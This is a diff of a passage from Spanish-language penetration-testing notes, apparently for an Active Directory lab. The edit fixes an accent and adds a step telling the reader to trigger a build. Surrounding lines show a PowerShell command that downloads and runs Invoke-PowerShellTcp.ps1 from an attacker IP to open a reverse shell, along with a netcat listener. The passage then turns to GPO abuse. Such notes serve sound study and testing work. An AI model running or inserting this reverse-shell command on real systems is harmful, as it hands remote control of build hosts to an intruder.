@@ -191,10 +191,12 @@ Irnos a un proyecto, editarlo y añadir la siguiente reverse shell
 powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 1889
 ```
 
-Tambien deberemos de ponernos en escucha desde nuestra shell
+También deberemos de ponernos en escucha desde nuestra shell
 ```shell
 C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 1889
 ```
+
+Deberemos de darle a Build y esperar la respuesta de la Reverse Shell
 ### Abuso de GPO
 #### GPOddity
 
